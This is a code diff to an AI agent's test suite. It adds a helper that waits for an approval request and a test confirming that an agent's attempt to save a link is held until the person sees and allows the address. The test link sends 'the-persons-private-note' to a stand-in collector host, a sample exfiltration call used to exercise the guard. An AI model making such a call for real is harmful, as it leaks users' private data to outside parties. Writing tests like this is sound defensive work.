@@ -56,6 +56,24 @@ const refusalOf = async (call: Promise<unknown>) => {
 const send = async (account: AgentAccount, text: string, threadId?: string) =>
   await asLaptop(account, async (client) => await client.agent.send({ text, threadId }));
 
+const askedRowSchema = z.object({ event_id: z.string(), json: z.string() });
+const askedEventSchema = z.object({ input: z.json() });
+
+// the approval a thread is waiting on, once it asks: the event an answer names, and what it asks
+const askedApproval = async (account: AgentAccount, threadId: string) =>
+  await vi.waitFor(
+    async () => {
+      const [row] = await cellRows(
+        account,
+        "SELECT event_id, json FROM thread_events WHERE thread_id = ? AND type = 'approval.asked'",
+        threadId,
+      );
+      const { event_id: eventId, json } = askedRowSchema.parse(row);
+      return { eventId, input: askedEventSchema.parse(JSON.parse(json)).input };
+    },
+    { interval: 50, timeout: 10_000 },
+  );
+
 // what today's ledger already booked, as if earlier turns had spent it
 const spentToday = async (account: AgentAccount, cents: number): Promise<void> => {
   await cellRows(
@@ -424,11 +442,51 @@ describe("a turn's seal", () => {
     },
   );
 
+  it(
+    "saves no link and reads no page until the person has seen the address and allowed it",
+    { timeout: TURN_MS },
+    async () => {
+      const account = agentAccount();
+      const url = "https://collector.example/?d=the-persons-private-note";
+      const sent = await send(account, script(`call save_link ${JSON.stringify({ url })}`));
+      const asked = await askedApproval(account, sent.threadId);
+      expect(asked.input).toStrictEqual({ url });
+      await expect(
+        cellRows(account, "SELECT id FROM jobs WHERE kind = 'fill'"),
+      ).resolves.toStrictEqual([]);
+      await expect(cellRows(account, "SELECT id FROM items")).resolves.toStrictEqual([]);
+      await asLaptop(
+        account,
+        async (client) =>
+          await client.agent.respond({
+            eventId: asked.eventId,
+            result: "deny",
+            threadId: sent.threadId,
+          }),
+      );
+      await settled(account, sent.threadId);
+      await expect(
+        cellRows(account, "SELECT id FROM jobs WHERE kind = 'fill'"),
+      ).resolves.toStrictEqual([]);
+      await expect(cellRows(account, "SELECT id FROM items")).resolves.toStrictEqual([]);
+    },
+  );
+
   it("reads a link the agent saved only once its turn seals", { timeout: TURN_MS }, async () => {
     const account = agentAccount();
     const sent = await send(
       account,
       script('call save_link {"url":"https://example.com/held"}', "stall"),
+    );
+    const asked = await askedApproval(account, sent.threadId);
+    await asLaptop(
+      account,
+      async (client) =>
+        await client.agent.respond({
+          eventId: asked.eventId,
+          result: "allow",
+          threadId: sent.threadId,
+        }),
     );
     // the link saved, the closing reply held open: the turn has not sealed
     await vi.waitFor(
